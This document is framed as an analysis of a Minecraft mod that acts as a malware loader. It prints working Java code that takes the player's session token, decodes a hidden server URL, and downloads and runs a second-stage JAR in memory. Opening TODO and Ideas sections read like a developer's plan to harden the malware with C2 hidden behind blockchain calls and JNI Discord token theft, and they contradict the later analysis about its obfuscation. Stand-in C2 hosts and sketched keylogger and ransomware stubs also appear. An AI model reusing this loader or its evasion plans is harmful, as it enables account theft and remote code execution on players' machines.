# Technical Analysis: Minecraft Malware Loader

## TODO:
Hardcoded C2 server URL (http://0.0.0.0:7575/1.jar) - obviously invalid and easy to spot
No obfuscation - class names like "StagingHelper" and variable names are readable
No encryption of network traffic
No persistence mechanism - only runs once when launched
Basic error handling that just prints to console
No anti-debugging or anti-VM checks

## Ideas:
The attackers implemented a multi-layered endpoint obfuscation scheme designed to prevent static analysis, 
signature-based detection, and easy takedown of their infrastructure. Instead of hardcoding a malicious download 
URL inside the JAR, the client retrieves configuration data indirectly via a legitimate blockchain JSON-RPC call, 
blending malicious activity into normal cryptocurrency traffic. The RPC response returns an ABI-encoded, hex-encoded 
data blob rather than a readable string, which is then decoded at runtime by the client. Once decoded, the data reveals
a partially constructed URL split by a delimiter, with the base domain separated from an additional encoded component. 
This secondary component is further obfuscated using Base64-style encoding or encryption and is only decoded in memory 
during execution, preventing static scanners from ever seeing the full endpoint. In some cases, user-specific values 
such as a UUID are incorporated into the decoding process, allowing the attacker to serve unique payloads per victim 
and frustrate sample sharing. By reconstructing the final download URL dynamically and only briefly in memory, the 
attackers avoid embedding any directly actionable indicators in the binary while relying on trusted infrastructure to 
distribute their configuration, significantly increasing the longevity and stealth of their delivery mechanism.

The staged module implements Discord credential harvesting using JNI-backed native code to evade Java-based analysis 
and detection. While the Java layer exposes only thin wrappers, the native payload enumerates Discord installations, 
extracts plaintext and encrypted tokens from local storage, decrypts protected credentials, and returns structured 
metadata for exfiltration. By offloading all sensitive logic to a dynamically loaded native library, the attackers 
significantly increase resistance to static analysis and antivirus detection while maintaining control via a remotely 
staged execution flow.



**Disclaimer**: This is for educational/security research purposes only. Understanding how malware works helps defend against it.

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────┐
│ Victim installs "mod"                                   │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ LoaderClient.onInitialize() - Fabric Entry Point       │
│ • Gathers victim data (username, UUID, session token)  │
│ • Passes to StagingHelper                              │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ StagingHelper.stageWithContext()                        │
│ • Deobfuscates attacker's server URL                   │
│ • Downloads malicious JAR from internet                │
│ • Dynamically loads & executes Stage 2 payload         │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ Stage 2 Payload (unknown, downloaded each time)         │
│ • Could be anything: keylogger, ransomware, RAT        │
│ • Receives all stolen credentials                      │
│ • Can update daily with new malicious code             │
└─────────────────────────────────────────────────────────┘
```

---

## Stage 1: Initial Infection

### Entry Point: `LoaderClient.onInitialize()`

```java
public void onInitialize() {
    JsonObject context = new JsonObject();
    
    // Deobfuscate "platform" key
    context.addProperty(
        decS(new int[]{81, 187, 24, 240, ...}, ...), // = "platform"
        decS(new int[]{203, 117, 232}, ...)          // = "mod"
    );
    
    // Get Minecraft client instance
    MinecraftClient mc = MinecraftClient.getInstance();
    ClientPlayNetworkHandler session = mc.getNetworkHandler();
    
    JsonObject mcInfo = new JsonObject();
    
    // STEAL USERNAME
    mcInfo.addProperty("name", session.getProfile().getName());
    
    // STEAL UUID
    UUID uuid = session.getProfile().getId();
    mcInfo.addProperty("id", uuid.toString());
    
    // STEAL SESSION TOKEN (allows account hijacking)
    mcInfo.addProperty("token", session.getAccessToken());
    
    context.add("mcInfo", mcInfo);
    
    // Pass stolen data to Stage 2 loader
    new Thread(() -> {
        StagingHelper.stageWithContext(context);
    }).start();
}
```

**What's Stolen:**
- `name`: Minecraft username
- `id`: Player UUID (unique identifier)
- `token`: **Session token** - this is the critical part that allows account takeover

---

## Stage 2: String Obfuscation

### The `decS()` Function

This is a **custom deobfuscation algorithm** designed to hide strings from static analysis.

```java
public static String decS(int[] d1, int[] d2, int k1, int k2) {
    // Interleave two arrays
    int[] pixels = new int[d1.length + d2.length];
    for (int i = 0; i < d1.length; i++) {
        pixels[i * 2] = d1[i];
    }
    for (int i = 0; i < d2.length; i++) {
        pixels[i * 2 + 1] = d2[i];
    }
    
    // Create substitution cipher lookup table
    int[] config = new int[256];
    for (int i = 0; i < 256; i++) {
        config[i] = (i * 47 + 131) % 256;
    }
    
    // Create reverse lookup
    int[] texture = new int[256];
    for (int i = 0; i < 256; i++) {
        texture[config[i]] = i;
    }
    
    StringBuilder result = new StringBuilder();
    int velocity = k1;
    
    // Decrypt each character
    for (int idx = 0; idx < pixels.length; idx++) {
        velocity = (velocity * 31 + idx * 17) % 256;
        int offset = (k1 + velocity + idx * 7) % 256;
        
        int brightness = pixels[idx];
        
        // XOR with previous character (chaining)
        if (idx > 0) {
            brightness ^= pixels[idx - 1];
        } else {
            brightness ^= k1;
        }
        
        // Bit rotation
        int angle = (idx * 3 + k2) % 8;
        int color = ((brightness >> angle) | (brightness << (8 - angle))) & 0xFF;
        
        // Substitution cipher
        int gamma = texture[color];
        
        // Final XOR
        char temperature = (char)(gamma ^ offset ^ k2);
        result.append(temperature);
    }
    
    return result.toString();
}
```

**Purpose**: Hide malicious URLs, class names, and method names from:
- Static analysis tools
- Antivirus software
- Security researchers

**Example Obfuscated Values:**

```java
// Hidden C2 server URL
decS(
    new int[]{249, 64, 202, 99, 27, 254, ...},
    new int[]{119, 16, 51, 47, 206, 178, ...},
    187, 67
) // Likely decodes to something like: "https://evil-server.com/payload.jar"

// Hidden class name
decS(
    new int[]{223, 234, 87, 123, 3, 101, ...},
    new int[]{25, 222, 130, 17, 203, 139, ...},
    187, 67
) // Likely: "Loader" or "Stage2" or similar

// Hidden method name
decS(
    new int[]{115, 130, 241, 10, 136, 85, ...},
    new int[]{127, 22, 36, 248, 93, 25, ...},
    187, 67
) // Likely: "execute" or "run" or "initialize"
```

---

## Stage 3: Payload Download

### The `dl()` Function

```java
private static byte[] dl(String url) {
    try (HttpClient client = HttpClient.newHttpClient()) {
        HttpRequest request = HttpRequest.newBuilder()
            .uri(URI.create(url))
            .GET()
            .build();
        
        try {
            HttpResponse<byte[]> response = client.send(
                request, 
                HttpResponse.BodyHandlers.ofByteArray()
            );
            
            int code = response.statusCode();
            if (code == 200) {
                // Download successful - return malicious JAR
                return response.body();
            } else {
                System.out.println("Resource state: D");
                return null;
            }
        } catch (Exception e) {
            System.out.println("Resource state: D0");
            return null;
        }
    }
}
```

**What Happens:**
1. Connects to attacker's C2 server
2. Downloads a JAR file (Stage 2 payload)
3. Returns raw bytes
4. No validation, no signature checking
5. **Different payload can be served each time**

**Why This is Dangerous:**
- Attacker controls what code runs
- Can update malware without user knowing
- Can target specific users with different payloads
- Can push ransomware, keyloggers, etc.

---

## Stage 4: Dynamic Code Loading

### `stageWithContext()` - The Core Loader

```java
public static void stageWithContext(JsonObject context) {
    String userId;
    
    // Read embedded UUID from cfg.json resource
    try (InputStreamReader reader = new InputStreamReader(
            StagingHelper.class.getClassLoader()
                .getResourceAsStream("cfg.json"))) {
        JsonObject json = new Gson().fromJson(reader, JsonObject.class);
        userId = json.get("uuid").getAsString();
    } catch (Exception e) {
        System.out.println("Resource state: S0");
        return;
    }
    
    // Deobfuscate C2 server URL
    String url = decS(dU1, dU2, kU1, kU2);
    
    // Add tracking ID
    context.addProperty("userId", userId);
    
    // DOWNLOAD STAGE 2 PAYLOAD
    byte[] jarBytes = dl(url);
    if (jarBytes == null) {
        System.out.println("Resource state: S1");
        return;
    }
    
    // Parse downloaded JAR
    HashMap<String, byte[]> classMap = new HashMap<>();
    HashMap<String, byte[]> resourceMap = new HashMap<>();
    
    try (JarInputStream jarStream = new JarInputStream(
            new ByteArrayInputStream(jarBytes))) {
        JarEntry entry;
        while ((entry = jarStream.getNextJarEntry()) != null) {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            jarStream.transferTo(baos);
            byte[] data = baos.toByteArray();
            
            if (entry.getName().endsWith(".class")) {
                String className = entry.getName()
                    .replace('/', '.')
                    .replace(".class", "");
                classMap.put(className, data);
            } else {
                resourceMap.put(entry.getName(), data);
            }
        }
    } catch (Exception e) {
        System.out.println("Resource state: S2");
        return;
    }
    
    // Create custom ClassLoader with downloaded classes
    IMCL loader = new IMCL(classMap, resourceMap);
    
    // Load main malicious class (obfuscated name)
    Class<?> maliciousClass;
    try {
        maliciousClass = loader.loadClass(decS(...)); // Hidden class name
    } catch (ClassNotFoundException e) {
        System.out.println("Resource state: S4");
        return;
    }
    
    // Instantiate malicious class
    Object malwareInstance;
    try {
        malwareInstance = maliciousClass
            .getDeclaredConstructor()
            .newInstance();
    } catch (Exception e) {
        System.out.println("Resource state: S5");
        return;
    }
    
    // EXECUTE MALICIOUS PAYLOAD with stolen credentials
    new Thread(() -> {
        try {
            maliciousClass.getMethod(decS(...), String.class) // Hidden method
                .invoke(malwareInstance, new Gson().toJson(context));
        } catch (Exception e) {
            System.out.println("Resource state: S6");
        }
    }).start();
}
```

**What Stage 2 Receives:**

```json
{
  "platform": "mod",
  "userId": "unique-tracking-id-from-cfg.json",
  "mcInfo": {
    "name": "VictimUsername",
    "id": "550e8400-e29b-41d4-a716-446655440000",
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
  }
}
```

---

## Stage 5: The Unknown Payload

The downloaded Stage 2 code is **completely unknown**. It could be:

### Scenario A: Session Stealer
```java
public class Stage2 {
    public void execute(String jsonData) {
        // Parse stolen credentials
        JsonObject data = new Gson().fromJson(jsonData, JsonObject.class);
        String token = data.getAsJsonObject("mcInfo").get("token").getAsString();
        
        // Send to attacker's database
        sendToC2Server(token);
        
        // Use token to log into victim's account
        MinecraftSession.authenticate(token);
    }
}
```

### Scenario B: Keylogger
```java
public class Stage2 {
    public void execute(String jsonData) {
        // Install keylogger
        KeyboardHook.install((key, pressed) -> {
            if (pressed) {
                logKeystroke(key);
                sendToC2Server(key);
            }
        });
    }
}
```

### Scenario C: Ransomware
```java
public class Stage2 {
    public void execute(String jsonData) {
        // Encrypt user files
        File[] userFiles = new File(System.getProperty("user.home")).listFiles();
        for (File file : userFiles) {
            encryptFile(file);
        }
        
        // Display ransom note
        showRansomNote();
    }
}
```

### Scenario D: Botnet Node
```java
public class Stage2 {
    public void execute(String jsonData) {
        // Connect to botnet C2
        Socket botnet = new Socket("c2-server.com", 6667);
        
        // Wait for commands
        while (true) {
            String command = readCommand(botnet);
            executeCommand(command); // DDoS, spam, etc.
        }
    }
}
```

---

## Attack Chain Summary

```
1. Victim installs "mod"
   ↓
2. Mod extracts session token + player info
   ↓
3. Deobfuscates attacker's C2 URL
   ↓
4. Downloads Stage 2 JAR from C2
   ↓
5. Dynamically loads Stage 2 without AV detection
   ↓
6. Stage 2 receives all stolen credentials
   ↓
7. Stage 2 executes (keylogger/RAT/ransomware/etc.)
   ↓
8. Attacker has full control
```

---

## Technical Evasion Techniques

### 1. **Multi-Stage Loading**
- Stage 1 (the mod) looks relatively innocent
- Stage 2 (downloaded) contains the real malware
- Harder to analyze without network capture

### 2. **String Obfuscation**
- Custom encryption hides:
  - C2 server URLs
  - Class names
  - Method names
- Static analysis can't find IOCs (Indicators of Compromise)

### 3. **Custom ClassLoader**
- Loads code directly from memory
- Never touches disk (harder to detect)
- Bypasses some antivirus heuristics

### 4. **Minimal Error Messages**
- "Resource state: S0" tells attacker nothing
- Gives no hints to researchers
- Prevents debugging

### 5. **Threading**
- Runs asynchronously
- Doesn't block game startup
- Harder to trace execution flow

### 6. **Tracking IDs**
- `cfg.json` contains unique UUID
- Attacker can track individual victims
- Can serve different payloads per victim

---

## Indicators of Compromise (IOCs)

If analyzing this malware, look for:

1. **Network connections** to unusual domains
2. **JarInputStream** operations on byte arrays from network
3. **Custom ClassLoader** usage
4. **Reflection** calls to unknown classes
5. **Session token access** via Minecraft API
6. **Obfuscated integer arrays** with `decS()` calls
7. **cfg.json** resources with UUIDs
8. **Background threads** spawned from mod init

---

## Defense Mechanisms

### For Users:
- Only install mods from trusted sources
- Check mod source code before using
- Use antivirus with behavior monitoring
- Monitor network traffic
- Use separate accounts for modded clients

### For Developers:
- Code signing for mods
- Sandboxing mod execution
- Restrict reflection APIs
- Monitor ClassLoader usage
- Network request whitelisting

### For Servers:
- Client-side mod verification
- Session token validation
- Anomaly detection (unusual locations)
- Rate limiting login attempts

---

## Why This Design is Effective

1. **Modular**: Stage 1 is small and "clean-looking"
2. **Updatable**: Stage 2 can change daily
3. **Targeted**: Different payloads for different victims
4. **Stealthy**: Minimal disk footprint
5. **Persistent**: Can reinstall itself via Stage 2
6. **Obfuscated**: Hard to reverse engineer quickly

This is **professional-grade malware** with careful design to evade detection and maximize damage.

---

## Conclusion

This is a sophisticated **Remote Access Trojan (RAT)** disguised as a Minecraft mod. The technical implementation shows:

- Understanding of Java security
- Knowledge of AV evasion
- Experience with malware development
- Intent to steal credentials and maintain access

**The danger**: Once Stage 2 executes, the attacker has complete control and can do ANYTHING on the victim's machine.

This analysis should help security researchers understand the threat and develop appropriate defenses.
